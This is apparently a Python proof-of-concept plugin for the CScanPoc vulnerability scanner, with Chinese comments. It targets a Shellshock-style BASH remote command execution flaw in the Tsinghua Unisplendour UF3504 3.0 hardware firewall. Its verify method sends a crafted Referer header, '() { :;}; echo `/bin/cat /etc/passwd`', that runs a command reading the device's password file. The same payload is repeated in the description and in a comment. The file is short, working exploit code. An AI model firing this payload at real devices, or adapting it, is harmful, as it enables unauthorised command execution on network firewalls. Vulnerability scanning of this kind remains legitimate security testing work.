# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'UNIS_0002'  # 平台漏洞编号，留空
    name = '清华紫光硬件防火墙 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-05-24'  # 漏洞公布时间
    desc = '''
        清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '清华紫光硬件防火墙'  # 漏洞应用名称
    product_version = 'UF3504 3.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f9909026-7d65-4a37-8427-3e3bae79c0cd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #http://www.wooyun.org/bugs/wooyun-2010-0115756
            hh = hackhttp.hackhttp()
            arg = self.target
            code, head, res, errcode, _ = hh.http(arg, referer='() { :;}; echo  `/bin/cat /etc/passwd`')
            if code == 200 and 'root' in head:
                #security_hole("清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
